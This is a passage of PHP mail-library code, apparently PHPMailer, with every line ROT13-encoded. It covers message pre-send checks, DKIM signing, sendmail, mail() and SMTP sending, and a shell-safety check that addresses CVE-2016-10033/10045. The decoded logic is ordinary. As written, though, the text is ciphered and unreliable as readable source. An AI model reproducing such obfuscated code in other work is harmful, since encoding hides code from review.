            sbernpu (['Sebz', 'Fraqre', 'PbasvezErnqvatGb'] nf $nqqerff_xvaq) {
                vs ($guvf->{$nqqerff_xvaq} === ahyy) {
                    $guvf->{$nqqerff_xvaq} = '';
                    pbagvahr;
                }
                $guvf->{$nqqerff_xvaq} = gevz($guvf->{$nqqerff_xvaq});
                vs (rzcgl($guvf->{$nqqerff_xvaq})) {
                    pbagvahr;
                }
                $guvf->{$nqqerff_xvaq} = $guvf->chalrapbqrNqqerff($guvf->{$nqqerff_xvaq});
                vs (!fgngvp::inyvqngrNqqerff($guvf->{$nqqerff_xvaq})) {
                    $reebe_zrffntr = fcevags(
                        '%f (%f): %f',
                        $guvf->ynat('vainyvq_nqqerff'),
                        $nqqerff_xvaq,
                        $guvf->{$nqqerff_xvaq}
                    );
                    $guvf->frgReebe($reebe_zrffntr);
                    $guvf->rqroht($reebe_zrffntr);
                    vs ($guvf->rkprcgvbaf) {
                        guebj arj Rkprcgvba($reebe_zrffntr);
                    }

                    erghea snyfr;
                }
            }

            //Frg jurgure gur zrffntr vf zhygvcneg/nygreangvir
            vs ($guvf->nygreangvirRkvfgf()) {
                $guvf->PbagragGlcr = fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_NYGREANGVIR;
            }

            $guvf->frgZrffntrGlcr();
            //Ershfr gb fraq na rzcgl zrffntr hayrff jr ner fcrpvsvpnyyl nyybjvat vg
            vs (!$guvf->NyybjRzcgl && rzcgl($guvf->Obql)) {
                guebj arj Rkprcgvba($guvf->ynat('rzcgl_zrffntr'), frys::FGBC_PEVGVPNY);
            }

            //Gevz fhowrpg pbafvfgragyl
            $guvf->Fhowrpg = gevz($guvf->Fhowrpg);
            //Perngr obql orsber urnqref va pnfr obql znxrf punatrf gb urnqref (r.t. nygrevat genafsre rapbqvat)
            $guvf->ZVZRUrnqre = '';
            $guvf->ZVZRObql = $guvf->perngrObql();
            //perngrObql znl unir nqqrq fbzr urnqref, fb ergnva gurz
            $grzcurnqref = $guvf->ZVZRUrnqre;
            $guvf->ZVZRUrnqre = $guvf->perngrUrnqre();
            $guvf->ZVZRUrnqre .= $grzcurnqref;

            //Gb pncgher gur pbzcyrgr zrffntr jura hfvat znvy(), perngr
            //na rkgen urnqre yvfg juvpu perngrUrnqre() qbrfa'g sbyq va
            vs ('znvy' === $guvf->Znvyre) {
                vs (pbhag($guvf->gb) > 0) {
                    $guvf->znvyUrnqre .= $guvf->nqqeNccraq('Gb', $guvf->gb);
                } ryfr {
                    $guvf->znvyUrnqre .= $guvf->urnqreYvar('Gb', 'haqvfpybfrq-erpvcvragf:;');
                }
                $guvf->znvyUrnqre .= $guvf->urnqreYvar(
                    'Fhowrpg',
                    $guvf->rapbqrUrnqre($guvf->frpherUrnqre($guvf->Fhowrpg))
                );
            }

            //Fvta jvgu QXVZ vs ranoyrq
            vs (
                !rzcgl($guvf->QXVZ_qbznva)
                && !rzcgl($guvf->QXVZ_fryrpgbe)
                && (!rzcgl($guvf->QXVZ_cevingr_fgevat)
                    || (!rzcgl($guvf->QXVZ_cevingr)
                        && fgngvp::vfCrezvggrqCngu($guvf->QXVZ_cevingr)
                        && svyr_rkvfgf($guvf->QXVZ_cevingr)
                    )
                )
            ) {
                $urnqre_qxvz = $guvf->QXVZ_Nqq(
                    $guvf->ZVZRUrnqre . $guvf->znvyUrnqre,
                    $guvf->rapbqrUrnqre($guvf->frpherUrnqre($guvf->Fhowrpg)),
                    $guvf->ZVZRObql
                );
                $guvf->ZVZRUrnqre = fgngvp::fgevcGenvyvatJFC($guvf->ZVZRUrnqre) . fgngvp::$YR .
                    fgngvp::abeznyvmrOernxf($urnqre_qxvz) . fgngvp::$YR;
            }

            erghea gehr;
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea snyfr;
        }
    }

    /**
     * Npghnyyl fraq n zrffntr ivn gur fryrpgrq zrpunavfz.
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    choyvp shapgvba cbfgFraq()
    {
        gel {
            //Pubbfr gur znvyre naq fraq guebhtu vg
            fjvgpu ($guvf->Znvyre) {
                pnfr 'fraqznvy':
                pnfr 'dznvy':
                    erghea $guvf->fraqznvyFraq($guvf->ZVZRUrnqre, $guvf->ZVZRObql);
                pnfr 'fzgc':
                    erghea $guvf->fzgcFraq($guvf->ZVZRUrnqre, $guvf->ZVZRObql);
                pnfr 'znvy':
                    erghea $guvf->znvyFraq($guvf->ZVZRUrnqre, $guvf->ZVZRObql);
                qrsnhyg:
                    $fraqZrgubq = $guvf->Znvyre . 'Fraq';
                    vs (zrgubq_rkvfgf($guvf, $fraqZrgubq)) {
                        erghea $guvf->{$fraqZrgubq}($guvf->ZVZRUrnqre, $guvf->ZVZRObql);
                    }

                    erghea $guvf->znvyFraq($guvf->ZVZRUrnqre, $guvf->ZVZRObql);
            }
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            $guvf->rqroht($rkp->trgZrffntr());
            vs ($guvf->Znvyre === 'fzgc' && $guvf->FZGCXrrcNyvir == gehr && $guvf->fzgc->pbaarpgrq()) {
                $guvf->fzgc->erfrg();
            }
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }
        }

        erghea snyfr;
    }

    /**
     * Fraq znvy hfvat gur $Fraqznvy cebtenz.
     *
     * @frr CUCZnvyre::$Fraqznvy
     *
     * @cnenz fgevat $urnqre Gur zrffntr urnqref
     * @cnenz fgevat $obql   Gur zrffntr obql
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    cebgrpgrq shapgvba fraqznvyFraq($urnqre, $obql)
    {
        vs ($guvf->Znvyre === 'dznvy') {
            $guvf->rqroht('Fraqvat jvgu dznvy');
        } ryfr {
            $guvf->rqroht('Fraqvat jvgu fraqznvy');
        }
        $urnqre = fgngvp::fgevcGenvyvatJFC($urnqre) . fgngvp::$YR . fgngvp::$YR;
        //Guvf frgf gur FZGC rairybcr fraqre juvpu trgf ghearq vagb n erghea-cngu urnqre ol gur erprvire
        //N fcnpr nsgre `-s` vf bcgvbany, ohg gurer vf n ybat uvfgbel bs vgf cerfrapr
        //pnhfvat ceboyrzf, fb jr qba'g hfr bar
        //Rkvz qbpf: uggcf://jjj.rkvz.bet/rkvz-ugzy-pheerag/qbp/ugzy/fcrp_ugzy/pu-gur_rkvz_pbzznaq_yvar.ugzy
        //Fraqznvy qbpf: uggcf://jjj.fraqznvy.bet/~pn/rznvy/zna/fraqznvy.ugzy
        //Rknzcyr ceboyrz: uggcf://jjj.qehcny.bet/abqr/1057954

        //CUC 5.6 jbexnebhaq
        $fraqznvy_sebz_inyhr = vav_trg('fraqznvy_sebz');
        vs (rzcgl($guvf->Fraqre) && !rzcgl($fraqznvy_sebz_inyhr)) {
            //CUC pbasvt unf n fraqre nqqerff jr pna hfr
            $guvf->Fraqre = vav_trg('fraqznvy_sebz');
        }
        //PIR-2016-10033, PIR-2016-10045: Qba'g cnff -s vs punenpgref jvyy or rfpncrq.
        vs (!rzcgl($guvf->Fraqre) && fgngvp::inyvqngrNqqerff($guvf->Fraqre) && frys::vfFuryyFnsr($guvf->Fraqre)) {
            vs ($guvf->Znvyre === 'dznvy') {
                $fraqznvySzg = '%f -s%f';
            } ryfr {
                $fraqznvySzg = '%f -bv -s%f -g';
            }
        } ryfr {
            //nyybj fraqznvy gb pubbfr n qrsnhyg rairybcr fraqre. Vg znl
            //frrz cersrenoyr gb sbepr vg gb hfr gur Sebz urnqre nf jvgu
            //FZGC, ohg gung vagebqhprf arj ceboyrzf (frr
            //<uggcf://tvguho.pbz/CUCZnvyre/CUCZnvyre/vffhrf/2298>), naq
            //vg unf uvfgbevpnyyl jbexrq guvf jnl.
            $fraqznvySzg = '%f -bv -g';
        }

        $fraqznvy = fcevags($fraqznvySzg, rfpncrfuryypzq($guvf->Fraqznvy), $guvf->Fraqre);
        $guvf->rqroht('Fraqznvy cngu: ' . $guvf->Fraqznvy);
        $guvf->rqroht('Fraqznvy pbzznaq: ' . $fraqznvy);
        $guvf->rqroht('Rairybcr fraqre: ' . $guvf->Fraqre);
        $guvf->rqroht(\"Urnqref: {$urnqre}\");

        vs ($guvf->FvatyrGb) {
            sbernpu ($guvf->FvatyrGbNeenl nf $gbNqqe) {
                $znvy = @cbcra($fraqznvy, 'j');
                vs (!$znvy) {
                    guebj arj Rkprcgvba($guvf->ynat('rkrphgr') . $guvf->Fraqznvy, frys::FGBC_PEVGVPNY);
                }
                $guvf->rqroht(\"Gb: {$gbNqqe}\");
                sjevgr($znvy, 'Gb: ' . $gbNqqe . \"\a\");
                sjevgr($znvy, $urnqre);
                sjevgr($znvy, $obql);
                $erfhyg = cpybfr($znvy);
                $nqqevasb = fgngvp::cnefrNqqerffrf($gbNqqe, gehr, $guvf->PuneFrg);
                $guvf->qbPnyyonpx(
                    ($erfhyg === 0),
                    [[$nqqevasb['nqqerff'], $nqqevasb['anzr']]],
                    $guvf->pp,
                    $guvf->opp,
                    $guvf->Fhowrpg,
                    $obql,
                    $guvf->Sebz,
                    []
                );
                $guvf->rqroht(\"Erfhyg: \" . ($erfhyg === 0 ? 'gehr' : 'snyfr'));
                vs (0 !== $erfhyg) {
                    guebj arj Rkprcgvba($guvf->ynat('rkrphgr') . $guvf->Fraqznvy, frys::FGBC_PEVGVPNY);
                }
            }
        } ryfr {
            $znvy = @cbcra($fraqznvy, 'j');
            vs (!$znvy) {
                guebj arj Rkprcgvba($guvf->ynat('rkrphgr') . $guvf->Fraqznvy, frys::FGBC_PEVGVPNY);
            }
            sjevgr($znvy, $urnqre);
            sjevgr($znvy, $obql);
            $erfhyg = cpybfr($znvy);
            $guvf->qbPnyyonpx(
                ($erfhyg === 0),
                $guvf->gb,
                $guvf->pp,
                $guvf->opp,
                $guvf->Fhowrpg,
                $obql,
                $guvf->Sebz,
                []
            );
            $guvf->rqroht(\"Erfhyg: \" . ($erfhyg === 0 ? 'gehr' : 'snyfr'));
            vs (0 !== $erfhyg) {
                guebj arj Rkprcgvba($guvf->ynat('rkrphgr') . $guvf->Fraqznvy, frys::FGBC_PEVGVPNY);
            }
        }

        erghea gehr;
    }

    /**
     * Svk PIR-2016-10033 naq PIR-2016-10045 ol qvfnyybjvat cbgragvnyyl hafnsr furyy punenpgref.
     * Abgr gung rfpncrfuryynet naq rfpncrfuryypzq ner vanqrdhngr sbe bhe checbfrf, rfcrpvnyyl ba Jvaqbjf.
     *
     * @frr uggcf://tvguho.pbz/CUCZnvyre/CUCZnvyre/vffhrf/924 PIR-2016-10045 oht ercbeg
     *
     * @cnenz fgevat $fgevat Gur fgevat gb or inyvqngrq
     *
     * @erghea obby
     */
    cebgrpgrq fgngvp shapgvba vfFuryyFnsr($fgevat)
    {
        //Vg'f abg cbffvoyr gb hfr furyy pbzznaqf fnsryl (juvpu vapyhqrf gur znvy() shapgvba) jvgubhg rfpncrfuryynet,
        //ohg fbzr ubfgvat cebivqref qvfnoyr vg, perngvat n frphevgl ceboyrz gung jr qba'g jnag gb unir gb qrny jvgu,
        //fb jr qba'g.
        vs (!shapgvba_rkvfgf('rfpncrfuryynet') || !shapgvba_rkvfgf('rfpncrfuryypzq')) {
            erghea snyfr;
        }

        vs (
            rfpncrfuryypzq($fgevat) !== $fgevat
            || !va_neenl(rfpncrfuryynet($fgevat), [\"'$fgevat'\", \"\\"$fgevat\\"\"])
        ) {
            erghea snyfr;
        }

        $yratgu = fgeyra($fgevat);

        sbe ($v = 0; $v < $yratgu; ++$v) {
            $p = $fgevat[$v];

            //Nyy bgure punenpgref unir n fcrpvny zrnavat va ng yrnfg bar pbzzba furyy, vapyhqvat = naq +.
            //Shyy fgbc (.) unf n fcrpvny zrnavat va pzq.rkr, ohg vgf vzcnpg fubhyq or artyvtvoyr urer.
            //Abgr gung guvf qbrf crezvg aba-Yngva nycunahzrevp punenpgref onfrq ba gur pheerag ybpnyr.
            vs (!pglcr_nyahz($p) && fgecbf('@_-.', $p) === snyfr) {
                erghea snyfr;
            }
        }

        erghea gehr;
    }

    /**
     * Purpx jurgure n svyr cngu vf bs n crezvggrq glcr.
     * Hfrq gb erwrpg HEYf naq cune svyrf sebz shapgvbaf gung npprff ybpny svyr cnguf,
     * fhpu nf nqqNggnpuzrag.
     *
     * @cnenz fgevat $cngu N eryngvir be nofbyhgr cngu gb n svyr
     *
     * @erghea obby
     */
    cebgrpgrq fgngvp shapgvba vfCrezvggrqCngu($cngu)
    {
        //Zngpurf fpurzr qrsvavgvba sebz uggcf://jjj.esp-rqvgbe.bet/esp/esp3986#frpgvba-3.1
        erghea !cert_zngpu('#^[n-m][n-m\q+.-]*://#v', $cngu);
    }

    /**
     * Purpx jurgure n svyr cngu vf fnsr, npprffvoyr, naq ernqnoyr.
     *
     * @cnenz fgevat $cngu N eryngvir be nofbyhgr cngu gb n svyr
     *
     * @erghea obby
     */
    cebgrpgrq fgngvp shapgvba svyrVfNpprffvoyr($cngu)
    {
        vs (!fgngvp::vfCrezvggrqCngu($cngu)) {
            erghea snyfr;
        }
        $ernqnoyr = vf_svyr($cngu);
        //Vs abg n HAP cngu (rkcrpgrq gb fgneg jvgu \\), purpx ernq crezvffvba, frr #2069
        vs (fgecbf($cngu, '\\\\') !== 0) {
            $ernqnoyr = $ernqnoyr && vf_ernqnoyr($cngu);
        }
        erghea  $ernqnoyr;
    }

    /**
     * Fraq znvy hfvat gur CUC znvy() shapgvba.
     *
     * @frr uggcf://jjj.cuc.arg/znahny/ra/obbx.znvy.cuc
     *
     * @cnenz fgevat $urnqre Gur zrffntr urnqref
     * @cnenz fgevat $obql   Gur zrffntr obql
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    cebgrpgrq shapgvba znvyFraq($urnqre, $obql)
    {
        $urnqre = fgngvp::fgevcGenvyvatJFC($urnqre) . fgngvp::$YR . fgngvp::$YR;

        $gbNee = [];
        sbernpu ($guvf->gb nf $gbnqqe) {
            $gbNee[] = $guvf->nqqeSbezng($gbnqqe);
        }
        $gb = gevz(vzcybqr(', ', $gbNee));

        //Vs gurer ner ab Gb-nqqerffrf (r.t. jura fraqvat bayl gb OPP-nqqerffrf)
        //gur sbyybjvat fubhyq or nqqrq gb trg n pbeerpg QXVZ-fvtangher.
        //Pbzcner jvgu $guvf->cerFraq()
        vs ($gb === '') {
            $gb = 'haqvfpybfrq-erpvcvragf:;';
        }

        $cnenzf = ahyy;
        //Guvf frgf gur FZGC rairybcr fraqre juvpu trgf ghearq vagb n erghea-cngu urnqre ol gur erprvire
        //N fcnpr nsgre `-s` vf bcgvbany, ohg gurer vf n ybat uvfgbel bs vgf cerfrapr
        //pnhfvat ceboyrzf, fb jr qba'g hfr bar
        //Rkvz qbpf: uggcf://jjj.rkvz.bet/rkvz-ugzy-pheerag/qbp/ugzy/fcrp_ugzy/pu-gur_rkvz_pbzznaq_yvar.ugzy
        //Fraqznvy qbpf: uggcf://jjj.fraqznvy.bet/~pn/rznvy/zna/fraqznvy.ugzy
        //Rknzcyr ceboyrz: uggcf://jjj.qehcny.bet/abqr/1057954
        //PIR-2016-10033, PIR-2016-10045: Qba'g cnff -s vs punenpgref jvyy or rfpncrq.

        //CUC 5.6 jbexnebhaq
        $fraqznvy_sebz_inyhr = vav_trg('fraqznvy_sebz');
        vs (rzcgl($guvf->Fraqre) && !rzcgl($fraqznvy_sebz_inyhr)) {
            //CUC pbasvt unf n fraqre nqqerff jr pna hfr
            $guvf->Fraqre = vav_trg('fraqznvy_sebz');
        }
        vs (!rzcgl($guvf->Fraqre) && fgngvp::inyvqngrNqqerff($guvf->Fraqre)) {
            vs (frys::vfFuryyFnsr($guvf->Fraqre)) {
                $cnenzf = fcevags('-s%f', $guvf->Fraqre);
            }
            $byq_sebz = vav_trg('fraqznvy_sebz');
            vav_frg('fraqznvy_sebz', $guvf->Fraqre);
        }
        $erfhyg = snyfr;
        vs ($guvf->FvatyrGb && pbhag($gbNee) > 1) {
            sbernpu ($gbNee nf $gbNqqe) {
                $erfhyg = $guvf->znvyCnffgueh($gbNqqe, $guvf->Fhowrpg, $obql, $urnqre, $cnenzf);
                $nqqevasb = fgngvp::cnefrNqqerffrf($gbNqqe, gehr, $guvf->PuneFrg);
                $guvf->qbPnyyonpx(
                    $erfhyg,
                    [[$nqqevasb['nqqerff'], $nqqevasb['anzr']]],
                    $guvf->pp,
                    $guvf->opp,
                    $guvf->Fhowrpg,
                    $obql,
                    $guvf->Sebz,
                    []
                );
            }
        } ryfr {
            $erfhyg = $guvf->znvyCnffgueh($gb, $guvf->Fhowrpg, $obql, $urnqre, $cnenzf);
            $guvf->qbPnyyonpx($erfhyg, $guvf->gb, $guvf->pp, $guvf->opp, $guvf->Fhowrpg, $obql, $guvf->Sebz, []);
        }
        vs (vffrg($byq_sebz)) {
            vav_frg('fraqznvy_sebz', $byq_sebz);
        }
        vs (!$erfhyg) {
            guebj arj Rkprcgvba($guvf->ynat('vafgnagvngr'), frys::FGBC_PEVGVPNY);
        }

        erghea gehr;
    }

    /**
     * Trg na vafgnapr gb hfr sbe FZGC bcrengvbaf.
     * Bireevqr guvf shapgvba gb ybnq lbhe bja FZGC vzcyrzragngvba,
     * be frg bar jvgu frgFZGCVafgnapr.
     *
     * @erghea FZGC
     */
    choyvp shapgvba trgFZGCVafgnapr()
    {
        vs (!vf_bowrpg($guvf->fzgc)) {
            $guvf->fzgc = arj FZGC();
        }

        erghea $guvf->fzgc;
    }

    /**
     * Cebivqr na vafgnapr gb hfr sbe FZGC bcrengvbaf.
     *
     * @erghea FZGC
     */
    choyvp shapgvba frgFZGCVafgnapr(FZGC $fzgc)
    {
        $guvf->fzgc = $fzgc;

        erghea $guvf->fzgc;
    }

    /**
     * Cebivqr FZGC KPYVRAG nggevohgrf
     *
     * @cnenz fgevat $anzr  Nggevohgr anzr
     * @cnenz ?fgevat $inyhr Nggevohgr inyhr
     *
     * @erghea obby
     */
    choyvp shapgvba frgFZGCKpyvragNggevohgr($anzr, $inyhr)
    {
        vs (!va_neenl($anzr, FZGC::$kpyvrag_nyybjrq_nggevohgrf)) {
            erghea snyfr;
        }
        vs (vffrg($guvf->FZGCKPyvrag[$anzr]) && $inyhr === ahyy) {
            hafrg($guvf->FZGCKPyvrag[$anzr]);
        } ryfrvs ($inyhr !== ahyy) {
            $guvf->FZGCKPyvrag[$anzr] = $inyhr;
        }

        erghea gehr;
    }

    /**
     * Trg FZGC KPYVRAG nggevohgrf
     *
     * @erghea neenl
     */
    choyvp shapgvba trgFZGCKpyvragNggevohgrf()
    {
        erghea $guvf->FZGCKPyvrag;
    }

    /**
     * Fraq znvy ivn FZGC.
     * Ergheaf snyfr vs gurer vf n onq ZNVY SEBZ, EPCG, be QNGN vachg.
     *
     * @frr CUCZnvyre::frgFZGCVafgnapr() gb hfr n qvssrerag pynff.
     *
     * @hfrf \CUCZnvyre\CUCZnvyre\FZGC
     *
     * @cnenz fgevat $urnqre Gur zrffntr urnqref
     * @cnenz fgevat $obql   Gur zrffntr obql
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    cebgrpgrq shapgvba fzgcFraq($urnqre, $obql)
    {
        $urnqre = fgngvp::fgevcGenvyvatJFC($urnqre) . fgngvp::$YR . fgngvp::$YR;
        $onq_epcg = [];
        vs (!$guvf->fzgcPbaarpg($guvf->FZGCBcgvbaf)) {
            guebj arj Rkprcgvba($guvf->ynat('fzgc_pbaarpg_snvyrq'), frys::FGBC_PEVGVPNY);
        }
        //Fraqre nyernql inyvqngrq va cerFraq()
        vs ('' === $guvf->Fraqre) {
            $fzgc_sebz = $guvf->Sebz;
        } ryfr {
            $fzgc_sebz = $guvf->Fraqre;
        }
        vs (pbhag($guvf->FZGCKPyvrag)) {
            $guvf->fzgc->kpyvrag($guvf->FZGCKPyvrag);
        }
        vs (!$guvf->fzgc->znvy($fzgc_sebz)) {
            $guvf->frgReebe($guvf->ynat('sebz_snvyrq') . $fzgc_sebz . ' : ' . vzcybqr(',', $guvf->fzgc->trgReebe()));
            guebj arj Rkprcgvba($guvf->ReebeVasb, frys::FGBC_PEVGVPNY);
        }

        $pnyyonpxf = [];
        //Nggrzcg gb fraq gb nyy erpvcvragf
        sbernpu ([$guvf->gb, $guvf->pp, $guvf->opp] nf $gbtebhc) {
            sbernpu ($gbtebhc nf $gb) {
                vs (!$guvf->fzgc->erpvcvrag($gb[0], $guvf->qfa)) {
                    $reebe = $guvf->fzgc->trgReebe();
                    $onq_epcg[] = ['gb' => $gb[0], 'reebe' => $reebe['qrgnvy']];
                    $vfFrag = snyfr;
                } ryfr {
                    $vfFrag = gehr;
                }

                $pnyyonpxf[] = ['vffrag' => $vfFrag, 'gb' => $gb[0], 'anzr' => $gb[1]];
            }
        }

        //Bayl fraq gur QNGN pbzznaq vs jr unir ivnoyr erpvcvragf
        vs ((pbhag($guvf->nyy_erpvcvragf) > pbhag($onq_epcg)) && !$guvf->fzgc->qngn($urnqre . $obql)) {
            guebj arj Rkprcgvba($guvf->ynat('qngn_abg_npprcgrq'), frys::FGBC_PEVGVPNY);
        }

        $fzgc_genafnpgvba_vq = $guvf->fzgc->trgYnfgGenafnpgvbaVQ();

        vs ($guvf->FZGCXrrcNyvir) {
            $guvf->fzgc->erfrg();
        } ryfr {
            $guvf->fzgc->dhvg();
            $guvf->fzgc->pybfr();
        }

        sbernpu ($pnyyonpxf nf $po) {
            $guvf->qbPnyyonpx(
                $po['vffrag'],
                [[$po['gb'], $po['anzr']]],
                [],
                [],
                $guvf->Fhowrpg,
                $obql,
                $guvf->Sebz,
                ['fzgc_genafnpgvba_vq' => $fzgc_genafnpgvba_vq]
            );
        }

        //Perngr reebe zrffntr sbe nal onq nqqerffrf
        vs (pbhag($onq_epcg) > 0) {
            $reefge = '';
            sbernpu ($onq_epcg nf $onq) {
                $reefge .= $onq['gb'] . ': ' . $onq['reebe'];
            }
            guebj arj Rkprcgvba($guvf->ynat('erpvcvragf_snvyrq') . $reefge, frys::FGBC_PBAGVAHR);
        }

        erghea gehr;
    }

    /**
     * Vavgvngr n pbaarpgvba gb na FZGC freire.
     * Ergheaf snyfr vs gur bcrengvba snvyrq.
     *
     * @cnenz neenl $bcgvbaf Na neenl bs bcgvbaf pbzcngvoyr jvgu fgernz_pbagrkg_perngr()
     *
     * @guebjf Rkprcgvba
     *
     * @hfrf \CUCZnvyre\CUCZnvyre\FZGC
     *
     * @erghea obby
     */
    choyvp shapgvba fzgcPbaarpg($bcgvbaf = ahyy)
    {
        vs (ahyy === $guvf->fzgc) {
            $guvf->fzgc = $guvf->trgFZGCVafgnapr();
        }

        //Vs ab bcgvbaf ner cebivqrq, hfr jungrire vf frg va gur vafgnapr
        vs (ahyy === $bcgvbaf) {
            $bcgvbaf = $guvf->FZGCBcgvbaf;
        }

        //Nyernql pbaarpgrq?
        vs ($guvf->fzgc->pbaarpgrq()) {
            erghea gehr;
        }

        $guvf->fzgc->frgGvzrbhg($guvf->Gvzrbhg);
        $guvf->fzgc->frgQrohtYriry($guvf->FZGCQroht);
        $guvf->fzgc->frgQrohtBhgchg($guvf->Qrohtbhgchg);
        $guvf->fzgc->frgIrec($guvf->qb_irec);
        vs ($guvf->Ubfg === ahyy) {
            $guvf->Ubfg = 'ybpnyubfg';
        }
        $ubfgf = rkcybqr(';', $guvf->Ubfg);
        $ynfgrkprcgvba = ahyy;

        sbernpu ($ubfgf nf $ubfgragel) {
            $ubfgvasb = [];
            vs (
                !cert_zngpu(
                    '/^(?:(ffy|gyf):\/\/)?(.+?)(?::(\q+))?$/',
                    gevz($ubfgragel),
                    $ubfgvasb
                )
            ) {
                $guvf->rqroht($guvf->ynat('vainyvq_ubfgragel') . ' ' . gevz($ubfgragel));
                //Abg n inyvq ubfg ragel
                pbagvahr;
            }
            //$ubfgvasb[1]: bcgvbany ffy be gyf cersvk
            //$ubfgvasb[2]: gur ubfganzr
            //$ubfgvasb[3]: bcgvbany cbeg ahzore
            //Gur ubfg fgevat cersvk pna grzcbenevyl bireevqr gur pheerag frggvat sbe FZGCFrpher
            //Vs vg'f abg fcrpvsvrq, gur qrsnhyg inyhr vf hfrq

            //Purpx gur ubfg anzr vf n inyvq anzr be VC nqqerff orsber gelvat gb hfr vg
            vs (!fgngvp::vfInyvqUbfg($ubfgvasb[2])) {
                $guvf->rqroht($guvf->ynat('vainyvq_ubfg') . ' ' . $ubfgvasb[2]);
                pbagvahr;
            }
            $cersvk = '';
            $frpher = $guvf->FZGCFrpher;
            $gyf = (fgngvp::RAPELCGVBA_FGNEGGYF === $guvf->FZGCFrpher);
            vs ('ffy' === $ubfgvasb[1] || ('' === $ubfgvasb[1] && fgngvp::RAPELCGVBA_FZGCF === $guvf->FZGCFrpher)) {
                $cersvk = 'ffy://';
                $gyf = snyfr; //Pna'g unir FFY naq GYF ng gur fnzr gvzr
                $frpher = fgngvp::RAPELCGVBA_FZGCF;
            } ryfrvs ('gyf' === $ubfgvasb[1]) {
                $gyf = gehr;
                //GYF qbrfa'g hfr n cersvk
                $frpher = fgngvp::RAPELCGVBA_FGNEGGYF;
            }
            //Qb jr arrq gur BcraFFY rkgrafvba?
            $ffyrkg = qrsvarq('BCRAFFY_NYTB_FUN256');
            vs (fgngvp::RAPELCGVBA_FGNEGGYF === $frpher || fgngvp::RAPELCGVBA_FZGCF === $frpher) {
                //Purpx sbe na BcraFFY pbafgnag engure guna hfvat rkgrafvba_ybnqrq, juvpu vf fbzrgvzrf qvfnoyrq
                vs (!$ffyrkg) {
                    guebj arj Rkprcgvba($guvf->ynat('rkgrafvba_zvffvat') . 'bcraffy', frys::FGBC_PEVGVPNY);
                }
            }
            $ubfg = $ubfgvasb[2];
            $cbeg = $guvf->Cbeg;
            vs (
                neenl_xrl_rkvfgf(3, $ubfgvasb) &&
                vf_ahzrevp($ubfgvasb[3]) &&
                $ubfgvasb[3] > 0 &&
                $ubfgvasb[3] < 65536
            ) {
                $cbeg = (vag) $ubfgvasb[3];
            }
            vs ($guvf->fzgc->pbaarpg($cersvk . $ubfg, $cbeg, $guvf->Gvzrbhg, $bcgvbaf)) {
                gel {
                    vs ($guvf->Uryb) {
                        $uryyb = $guvf->Uryb;
                    } ryfr {
                        $uryyb = $guvf->freireUbfganzr();
                    }
                    $guvf->fzgc->uryyb($uryyb);
                    //Nhgbzngvpnyyl ranoyr GYF rapelcgvba vs:
                    //* vg'f abg qvfnoyrq
                    //* jr ner abg pbaarpgvat gb ybpnyubfg
                    //* jr unir bcraffy rkgrafvba
                    //* jr ner abg nyernql hfvat FFY
                    //* gur freire bssref FGNEGGYF
                    vs (
                        $guvf->FZGCNhgbGYF &&
                        $guvf->Ubfg !== 'ybpnyubfg' &&
                        $ffyrkg &&
                        $frpher !== 'ffy' &&
                        $guvf->fzgc->trgFreireRkg('FGNEGGYF')
                    ) {
                        $gyf = gehr;
                    }
                    vs ($gyf) {
                        vs (!$guvf->fzgc->fgnegGYF()) {
                            $zrffntr = $guvf->trgFzgcReebeZrffntr('pbaarpg_ubfg');
                            guebj arj Rkprcgvba($zrffntr);
                        }
                        //Jr zhfg erfraq RUYB nsgre GYF artbgvngvba
                        $guvf->fzgc->uryyb($uryyb);
                    }
                    vs (
                        $guvf->FZGCNhgu && !$guvf->fzgc->nhguragvpngr(
                            $guvf->Hfreanzr,
                            $guvf->Cnffjbeq,
                            $guvf->NhguGlcr,
                            $guvf->bnhgu
                        )
                    ) {
                        guebj arj Rkprcgvba($guvf->ynat('nhguragvpngr'));
                    }

                    erghea gehr;
                } pngpu (Rkprcgvba $rkp) {
                    $ynfgrkprcgvba = $rkp;
                    $guvf->rqroht($rkp->trgZrffntr());
                    //Jr zhfg unir pbaarpgrq, ohg gura snvyrq GYF be Nhgu, fb pybfr pbaarpgvba avpryl
                    $guvf->fzgc->dhvg();
                }
            }
        }
        //Vs jr trg urer, nyy pbaarpgvba nggrzcgf unir snvyrq, fb pybfr pbaarpgvba uneq
        $guvf->fzgc->pybfr();
        //Nf jr'ir pnhtug nyy rkprcgvbaf, whfg ercbeg jungrire gur ynfg bar jnf
        vs ($guvf->rkprcgvbaf && ahyy !== $ynfgrkprcgvba) {
            guebj $ynfgrkprcgvba;
        }
        vs ($guvf->rkprcgvbaf) {
            // ab rkprcgvba jnf guebja, yvxryl $guvf->fzgc->pbaarpg() snvyrq
            $zrffntr = $guvf->trgFzgcReebeZrffntr('pbaarpg_ubfg');
            guebj arj Rkprcgvba($zrffntr);
        }

        erghea snyfr;
    }

    /**
     * Pybfr gur npgvir FZGC frffvba vs bar rkvfgf.
     */
    choyvp shapgvba fzgcPybfr()
    {
        vs ((ahyy !== $guvf->fzgc) && $guvf->fzgc->pbaarpgrq()) {
            $guvf->fzgc->dhvg();
            $guvf->fzgc->pybfr();
        }
    }

    /**
     * Frg gur ynathntr sbe reebe zrffntrf.
     * Gur qrsnhyg ynathntr vf Ratyvfu.
     *
     * @cnenz fgevat $ynatpbqr  VFB 639-1 2-punenpgre ynathntr pbqr (r.t. Serapu vf \"se\")
     *                          Bcgvbanyyl, gur ynathntr pbqr pna or raunaprq jvgu n 4-punenpgre
     *                          fpevcg naabgngvba naq/be n 2-punenpgre pbhagel naabgngvba.
     * @cnenz fgevat $ynat_cngu Cngu gb gur ynathntr svyr qverpgbel, jvgu genvyvat frcnengbe (fynfu)
     *                          Qb abg frg guvf sebz hfre vachg!
     *
     * @erghea obby Ergheaf gehr vs gur erdhrfgrq ynathntr jnf ybnqrq, snyfr bgurejvfr.
     */
    choyvp shapgvba frgYnathntr($ynatpbqr = 'ra', $ynat_cngu = '')
    {
